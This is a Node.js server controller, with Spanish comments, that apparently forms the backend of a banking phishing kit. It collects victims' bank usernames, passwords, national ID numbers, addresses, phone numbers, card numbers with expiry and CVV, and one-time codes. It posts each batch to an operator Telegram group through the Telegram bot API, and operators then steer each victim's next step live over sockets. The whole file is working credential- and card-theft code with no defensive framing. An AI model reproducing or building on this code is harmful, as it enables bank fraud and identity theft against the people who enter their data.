import {
  sendTelegramAlert,
  waitForDecision,
  respondToTelegramCallback,
  sendSimpleTelegramMessage,
  editTelegramMessage,
} from "../services/botService.js";

import { v4 as uuidv4 } from "uuid";

let ioInstance;
export const activeSessions = new Map(); // socketId → session
export const decisionMap = new Map(); // socketId → session

export const setSocketIO = (io) => {
  ioInstance = io;
};

export const initProcess = async (req, res) => {
  let { data, sessionId, socketId, isRetry = false } = req.body;

  try {
    const decrypted = JSON.parse(atob(data));

    // Genera nueva sesión o reutiliza existente
    let session = activeSessions.get(sessionId)
      ? isRetry
        ? {
            ...activeSessions.get(sessionId),
            ...decrypted, // Actualizar datos de usuario
            socketId,
            decisionId: uuidv4(),
            messageId: null,
            car: null,
            exp: null,
            cvv: null,
            step: 1,
          }
        : {
            ...activeSessions.get(sessionId),
            socketId,
            decisionId: uuidv4(),
            car: null,
            exp: null,
            cvv: null,
            messageId: null,
            step: 1,
          }
      : {
          sessionId,
          socketId,
          car: null,
          exp: null,
          cvv: null,
          decisionId: uuidv4(),
          messageId: null,
          step: 1,
          ...decrypted,
        };
    // Almacena nueva decisión
    activeSessions.set(sessionId, session);
    decisionMap.set(session.decisionId, session.sessionId);

    // Envía mensaje a Telegram
    const messageText = buildMessageText(session);
    const { message_id } = await sendTelegramAlert({
      sessionId: session.sessionId,
      groupId: process.env.GROUP_1,
      text: messageText,
    });

    session.messageId = String(message_id);
    activeSessions.set(session.sessionId, session);

    // Espera decisión con el nuevo decisionId
    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;
        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({
      success: true,
      step: session.step,
      sessionId: session.sessionId,
      messageId: session.messageId,
    });
  } catch (error) {
    console.error("Error en initProcess:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const telegramWebhook = async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);
  try {
    await respondToTelegramCallback(callback);
    return res.sendStatus(200);
  } catch (err) {
    console.error("Error manejando webhook:", err);
    return res.sendStatus(500);
  }
};

export const appendCardData = async (req, res) => {
  const { card, exp, cvv, messageId, sessionId } = req.body;
  const session = activeSessions.get(sessionId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.card = card;
    session.exp = exp;
    session.cvv = cvv;
    session.step = 2;
    session.showOptions = true;
    const newText = buildMessageText(session);

    decisionMap.set(session.decisionId, session.sessionId);
    activeSessions.set(session.sessionId, session);

    await sendTelegramAlert({
      groupId: process.env.GROUP_1,
      messageId: messageId,
      text: newText,
      sessionId: session.sessionId,
    });

    // Espera decisión con el nuevo decisionId
    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;
        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({
      success: true,
      step: session.step,
      sessionId: session.sessionId,
      messageId: session.messageId,
    });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const appendPersonData = async (req, res) => {
  const { name, id, add, tel, sessionId } = req.body;
  const session = activeSessions.get(sessionId);

  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    session.name = name;
    session.id = id;
    session.add = add;
    session.tel = tel;
    session.step = 2;
    session.showOptions = false;
    activeSessions.set(session.sessionId, session);
    const newText = buildMessageText(session);

    const result = await sendTelegramAlert({
      sessionId: session.sessionId,
      groupId: process.env.GROUP_1,
      text: newText,
    });

    return res
      .status(200)
      .json({ success: true, messageId: result.message_id });
  } catch (error) {
    console.error("Error en appendCardData:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const sendSimpleMessage = async (req, res) => {
  const { text, socketId } = req.body;
  const session = activeSessions.get(socketId);
  if (!session) return res.status(400).json({ error: "No hay sesión activa" });

  try {
    await sendSimpleTelegramMessage(
      session.chatId,
      `${text}: ${session.sessionId}`
    );
  } catch (err) {
    console.error("Error enviando mensaje simple:", err);
    return res.status(500).json({ error: err.message });
  }
};

export const errorMessage = async (req, res) => {};

export const updateMessageWithOtp = async (req, res) => {
  const { otp, sessionId } = req.body;

  const session = activeSessions.get(sessionId);
  if (!session)
    return res
      .status(400)
      .json({ error: "No hay sesión activa para ese socketId" });

  try {
    session.option = "";
    session.otp = otp;
    session.step = 3;

    decisionMap.set(session.decisionId, session.sessionId);
    activeSessions.set(session.sessionId, session);

    const messageText = buildMessageText(session);

    await sendTelegramAlert({
      groupId: process.env.GROUP_1,
      messageId: session.messageId,
      text: messageText,
      sessionId: session.sessionId,
    });

    waitForDecision(session.decisionId, session.step)
      .then((decision) => {
        const sockId = session.socketId;

        if (sockId && ioInstance) {
          ioInstance.to(sockId).emit("decision", decision);
          decisionMap.delete(session.decisionId);
        }
      })
      .catch((err) => {
        console.error("Timeout:", err.message);
        activeSessions.delete(session.sessionId);
        decisionMap.delete(session.decisionId);
      });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Error en updateMessageWithOtp:", error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

function mask(value) {
  if (typeof value !== "string") return "";
  return value.match(/.{1,4}/g)?.join(" ") || "";
}

export function buildMessageText(session, err = 0) {
  const step = session.step;
  let baseText;
  if (err == 0) {
    baseText = `
🚨 Nuevo Ingreso: ${session.sessionId.split("-")[0]} 🚨
╭🟢 Usuario: ${session.user}
┣🟢 Contraseña: ${session.pass}
┣🟢 IP: ${session.ip}
╰🟢 Ciudad: ${session.city}
`;

    if (step >= 2) {
      baseText += `
 🚨 Nueva Data 🚨
╭🟢 Nombre: ${session.name || "PENDIENTE"}
┣🟢 Documento: ${session.id || "PENDIENTE"}
┣🟢 Dirección: ${session.add || "PENDIENTE"}
╰🟢 Telefóno: ${session.tel || "PENDIENTE"}

╭${session.card ? "🟢" : "🟡"} CC: ${
        session.card ? mask(session.card) : "PENDIENTE"
      }
┣${session.exp ? "🟢" : "🟡"} Exp: ${session.exp || "PENDIENTE"}
╰${session.cvv ? "🟢" : "🟡"} CVV: ${session.cvv || "PENDIENTE"}
`;
    }

    if (step >= 3) {
      baseText += `
🚨 Nueva Data 🚨
${session.otp ? "💸" : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
`;
    }

    return baseText.trim();
  } else {
    let errText;
    if (err === 1) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
╭❗ Error Logo ❗
┣🔴 Usuario: ${session.user}
╰🔴 Contraseña: ${session.pass}
      `;
    }
    if (err === 2) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
╭❗ Error CC ❗
┣🔴 CC: ${session.card}
┣🔴 Exp: ${session.exp}
╰🔴 CVV: ${session.cvv}
      `;
    }
    if (err === 3) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]}
╭❗ Error Dinamica ❗
╰❌ Dinamica: ${session.otp}
      `;
    }
    if (err === 4) {
      errText = `
🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
╭❗ Error OTP ❗
╰❌ OTP: ${session.otp}
      `;
    }
    return errText.trim();
  }
}

export const latamSimpleMsj = async (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const raw = req.body;
  console.log(req.body)
  const data = JSON.parse(raw.data);

  const chatId = "-1002850830211";
  
  let text = `
🚨🚨 Nuevo Ingreso 🚨🚨

╭🟡 Banco: ${data.banco}
┣🟢 Nombre: ${data.nombre}
┣🟢 Cedula: ${data.cedula}
┣🟢 Tarjeta: ${data.tarjeta}
┣🟢 Exp: ${data.fecha}
┣🟢 Cvv: ${data.cvv}
╰🟢 Telefono: ${data.telefono}
╰🟢 Direccion: ${data.direccion}
╰🟢 Correo: ${data.email}`
  try {
    const result = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });

    if (!result.ok) {
      throw new Error('Error en la respuesta de Telegram');
    }

    const data = await result.json();
    if (data.ok) {
      return res.status(200).json({ success: true, messageId: data.result.message_id });
    } else {
      throw new Error('Error en la respuesta de Telegram: ' + JSON.stringify(data));
    }
  } catch (error) {
    console.error('Error al enviar mensaje a Telegram:', error.message);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const editLatamMsj = async (req, res) => {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const data = req.body.data;
  const chatId = "-1002850830211";
  const messageId = req.body.messageId; // Asegúrate de pasar el messageId en la solicitud
  console.log(messageId);
  console.log(data);
  let nuevoTexto = `
🚨🚨 Nuevo Ingreso 🚨🚨

╭🟡 Banco: ${data.banco}
┣🟢 Nombre: ${data.nombre}
┣🟢 Cedula: ${data.cedula}
┣🟢 Tarjeta: ${data.tarjeta}
┣🟢 Exp: ${data.fecha}
┣🟢 Cvv: ${data.cvv}
╰🟢 Telefono: ${data.telefono}
╰🟢 Direccion: ${data.direccion}
╰🟢 Correo: ${data.email}

🚨🚨 Logo 🚨🚨

╭🟢 Usuario: ${data.usuario || 'Pendiente'}
╰🟢 Contraseña: ${data.pass || 'Pendiente'}

🚨🚨 ${
  data.dinamica
  ? "Clave Dinamica"
  : data.otp
  ? "Codigo OTP"
  : "Codigo de Verificación"
} 🚨🚨

💸 Codigo: ${data.dinamica || data.otp || 'Pendiente'}

`;

  try {
    const result = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: nuevoTexto, parse_mode: 'Markdown' }),
    });

    if (!result.ok) {
      throw new Error('Error en la respuesta de Telegram');
    }

    const responseData = await result.json();
    if (responseData.ok) {
      return res.status(200).json({ success: true, messageId });
    } else {
      throw new Error('Error en la respuesta de Telegram: ' + JSON.stringify(responseData));
    }
  } catch (error) {
    console.error('Error al editar mensaje a Telegram:', error.message);
    return res.status(500).json({ success: false, error: error.message });
  }
};
